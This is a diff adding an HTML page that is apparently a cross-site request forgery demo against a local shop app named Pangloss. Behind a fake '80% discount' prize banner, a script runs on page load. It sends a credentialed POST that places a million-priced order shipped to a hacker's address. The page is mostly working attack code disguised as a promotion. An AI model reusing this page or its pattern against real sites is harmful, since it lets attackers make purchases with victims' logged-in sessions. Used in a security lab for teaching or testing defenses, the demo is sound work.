@@ -1,0 +1,66 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Pangloss Purchase</title>
+    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"/>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
+    <link href="https://code.getmdl.io/1.3.0/material.deep_purple-yellow.min.css" rel="stylesheet"/>
+    <link href="https://localhost:1759/css/pangloss.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet" type="text/css"/>
+    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+          rel="stylesheet"/>
+</head>
+<script>
+    function hack(){
+        var cart = {
+            "items": [{
+                        "id": "id",
+                        "name": "Really Expensive Item",
+                        "price": "1000000.00"
+                        }],
+            "address": "42 rue du Hacker, DarkWeb"}
+
+        var data = JSON.stringify(cart);
+
+        var xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+
+        xhr.addEventListener("readystatechange", function () {
+            if (this.readyState === 4) {
+                console.log(this.responseText);
+            }
+        });
+
+        xhr.open("POST", "https://localhost:1759/api/carts");
+        xhr.setRequestHeader("Accept", "application/json");
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.setRequestHeader("cache-control", "no-cache");
+
+        xhr.send(data);
+    }
+
+
+
+
+
+
+
+</script>
+<body onload="hack()">
+<header class="mdl-layout__header mdl-layout__header--scroll mdl-color--primary">
+    <div class="header mmdl-layout__header-row">
+        <img class="logo" src="https://localhost:1759/images/wig.png"/>
+        <h5 class="title">Pangloss</h5>
+    </div>
+</header>
+<div class="content">
+    <div class="cart mdl-card mdl-shadow--2dp">
+        <div class="cart-header mdl-card__title">
+            <img src="https://localhost:1759/images/wig.png"/>
+            <h2 class="mdl-card__title-text">Congratulations! You have won 80% discount !!!!</h2>
+        </div>
+    </div>
+</div>
+</body>
+</html>
